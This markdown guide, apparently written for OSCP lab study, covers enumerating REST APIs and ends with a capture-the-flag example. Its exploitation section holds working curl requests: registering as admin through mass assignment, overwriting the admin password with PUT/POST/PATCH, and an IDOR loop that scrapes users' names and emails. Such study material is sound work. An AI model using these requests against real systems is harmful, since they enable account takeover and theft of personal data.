# Web API Enumeration & Exploitation Guide

## Overview
This guide covers systematic approaches for discovering and exploiting REST APIs during black-box penetration testing, with practical examples from OSCP labs.

## API Discovery Methodology

### Phase 1: Initial Enumeration

#### Identify API Patterns
```bash
# APIs typically follow these patterns:
/api/v1
/api/v2
/api_name/v1
/rest/v1
/v1/resource
/v2/resource
```

#### Technology Fingerprinting
```bash
whatweb http://TARGET -v
# Purpose: Identify framework (Flask/Werkzeug, Node.js, etc.)
# -v: Verbose output for detailed technology stack
# Look for: Server headers, frameworks, versions
```

### Phase 2: Brute Force API Endpoints

#### Basic Directory Enumeration
```bash
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt
# Purpose: Discover base API paths
# -u: Target URL with port
# -w: Wordlist for common API names
```

#### Pattern-Based Enumeration
Create pattern file (`api-pattern.txt`):
```
{GOBUSTER}/v1
{GOBUSTER}/v2
/api/{GOBUSTER}
/rest/{GOBUSTER}
```

Run with patterns:
```bash
gobuster dir -u http://TARGET:PORT -w /usr/share/wordlists/dirb/big.txt -p api-pattern.txt
# Purpose: Find versioned API endpoints
# -p: Pattern file with placeholders
# {GOBUSTER}: Replaced with wordlist entries
```

#### Common API Endpoints to Check
```bash
for endpoint in users books auth login register admin console ui docs swagger; do
  echo -n "$endpoint: "
  curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:PORT/$endpoint
done
# Purpose: Quick check for common API paths
# Look for: 200, 301, 302, 405 responses (not 404)
```

### Phase 3: API Interrogation

#### Inspect Discovered Endpoints
```bash
curl -i http://TARGET:PORT/users/v1
# Purpose: Get API response with headers
# -i: Include HTTP headers
# Look for: JSON structure, user data, API documentation
```

#### Test HTTP Methods
```bash
curl -X GET http://TARGET:PORT/api/endpoint
curl -X POST http://TARGET:PORT/api/endpoint
curl -X PUT http://TARGET:PORT/api/endpoint
curl -X DELETE http://TARGET:PORT/api/endpoint
curl -X OPTIONS http://TARGET:PORT/api/endpoint
# Purpose: Identify supported HTTP methods
# 405 Method Not Allowed = endpoint exists but method wrong
# 404 Not Found = endpoint doesn't exist
```

#### Enumerate Sub-Resources
```bash
# If /users/v1 returns user list with "admin" user:
gobuster dir -u http://TARGET:PORT/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
# Purpose: Find user-specific endpoints
# Common findings: /password, /email, /profile, /settings
```

## API Exploitation Techniques

### Authentication Bypass

#### 1. Test Registration Endpoint
```bash
# Find registration endpoint
curl http://TARGET:PORT/users/v1/register

# Attempt registration with admin privileges
curl -d '{"username":"attacker","password":"pass123","email":"test@test.com","admin":"True"}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/users/v1/register
# Purpose: Register as admin user
# Try variations: "admin":true, "role":"admin", "isAdmin":1
```

#### 2. Login and Get Token
```bash
curl -d '{"username":"attacker","password":"pass123"}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/users/v1/login
# Purpose: Obtain authentication token (JWT, session, etc.)
# Save token from response for authenticated requests
```

### Password Reset/Change Attacks

#### Test Password Change Methods
```bash
# Try different HTTP methods on password endpoint
TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# POST method
curl -X POST http://TARGET:PORT/users/v1/admin/password \
     -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"password":"newpass"}'

# PUT method (often used for updates)
curl -X PUT http://TARGET:PORT/users/v1/admin/password \
     -H "Authorization: Bearer $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"password":"newpass"}'

# PATCH method
curl -X PATCH http://TARGET:PORT/users/v1/admin/password \
     -H "Authorization: OAuth $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"password":"newpass"}'
```

### Common API Vulnerabilities

#### IDOR (Insecure Direct Object Reference)
```bash
# If /users/1 shows user data, try:
for id in {1..100}; do
  curl -s http://TARGET:PORT/users/$id | grep -E "username|email"
done
# Purpose: Access other users' data
```

#### Mass Assignment
```bash
# During registration/update, add extra fields:
curl -d '{"username":"test","password":"pass","role":"admin","verified":true}' \
     -H 'Content-Type: application/json' \
     http://TARGET:PORT/api/register
# Purpose: Set privileged attributes not intended for user control
```

## Using Burp Suite for API Testing

### Setup Proxy
```bash
# Send curl requests through Burp
curl --proxy 127.0.0.1:8080 http://TARGET:PORT/api/endpoint
# Purpose: Capture in Burp for modification/replay
```

### Burp Workflow
1. **Proxy Tab**: Intercept initial API requests
2. **Repeater Tab**: Modify and replay requests
3. **Intruder Tab**: Brute force parameters/values
4. **Site Map**: View discovered API structure

### Intruder Attack Types for APIs
- **Sniper**: Single parameter fuzzing (e.g., user IDs)
- **Battering Ram**: Same payload in multiple positions
- **Pitchfork**: Different payloads for each position
- **Cluster Bomb**: All combinations of payloads

## Documentation Discovery

### Common Documentation Paths
```bash
for doc in ui docs api-docs swagger documentation openapi.json swagger.json; do
  echo -n "$doc: "
  curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:PORT/$doc
done
# Purpose: Find API documentation
# /ui often contains Swagger/OpenAPI interface
```

## Response Analysis Checklist

### Status Codes
- **200**: Success - analyze response data
- **201**: Created - resource was created
- **401**: Unauthorized - need authentication
- **403**: Forbidden - authenticated but not authorized
- **405**: Method Not Allowed - endpoint exists, wrong method
- **500**: Server Error - potential for information disclosure

### Response Headers
```bash
curl -I http://TARGET:PORT/api/endpoint | grep -E "Server|X-Powered-By|Content-Type"
# Purpose: Identify technologies and accepted formats
# Look for: Framework versions, API versioning, content types
```

## Practical CTF Example: Maps Challenge

### Discovery Flow
```bash
# 1. Check robots.txt for hidden paths
curl http://192.168.187.52/robots.txt
# Found: /flag6773CA0FF1.html with flag part 1

# 2. Look for "important map" (sitemap.xml)
curl http://192.168.187.52/sitemap.xml

# 3. Check JavaScript source maps
curl http://192.168.187.52/dist/js/bootstrap.min.js.map

# 4. Enumerate map-related endpoints
for map in map maps sitemap source-map site-map; do
  curl -s -o /dev/null -w "%{url} - %{http_code}\n" http://192.168.187.52/$map
done
```

## Tools Reference

### Essential Tools
- **gobuster**: Directory/file brute forcing with patterns
- **wfuzz**: Flexible fuzzing tool for parameters
- **curl**: Manual API interaction and testing
- **Burp Suite**: Comprehensive proxy and testing platform
- **nikto**: Web vulnerability scanner
- **ffuf**: Fast web fuzzer with advanced filtering

### Wordlists for API Testing
```bash
/usr/share/wordlists/dirb/big.txt           # General paths
/usr/share/wordlists/dirb/small.txt         # Quick enumeration
/usr/share/seclists/Discovery/Web-Content/  # Comprehensive lists
/usr/share/seclists/Discovery/API/          # API-specific
```

## Key Takeaways

1. **Method Matters**: 405 means endpoint exists but wrong HTTP method
2. **Version Patterns**: APIs often use /v1, /v2 versioning
3. **Documentation Gold**: /ui, /docs, swagger paths reveal everything
4. **Token Types**: Look for JWT, OAuth, Bearer tokens in responses
5. **Privilege Escalation**: Test registration with admin/role parameters
6. **Response Mining**: Error messages reveal valid parameters/structure

## OSCP Exam Tips

- Document every API endpoint discovered
- Screenshot successful authentication/privilege escalation
- Save curl commands that worked for your report
- Test all HTTP methods on interesting endpoints
- Check for both /api/v1 and /v1/api patterns
- Remember PUT often works when POST doesn't for updates